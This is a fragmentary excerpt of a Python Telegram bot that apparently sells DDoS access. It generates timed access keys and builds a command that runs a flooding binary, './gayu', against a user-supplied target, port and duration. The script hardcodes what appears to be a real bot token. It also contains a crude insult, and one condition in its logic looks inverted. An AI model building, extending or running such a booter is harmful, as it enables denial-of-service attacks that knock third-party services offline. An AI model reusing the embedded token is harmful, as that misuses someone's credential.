...
bot = telebot.TeleBot('8101255502:AAGC19JHF_foJqlheRJeid6PC5xbKGt8LGI')
...
MAX_ATTACK_TIME = 239  # Example: Default maximum attack time set to 239 seconds
...
def create_random_key():
    key = "iNSANE_PAMPA-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 CUMBACK 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃!", reply_markup=markup)
...
def genkey_command(message):
    ...
    durations = ["1hour", "5hours", "1day", "3days", "7days", "999days"]
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./gayu {target} {port} {attack_time} 1200"  # ✅ Correct variable name
                ...
                response = (
                    ...
                    f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: iNSANE PAPA K BETE HO TM AAND K NICHE RHOGE"
                )
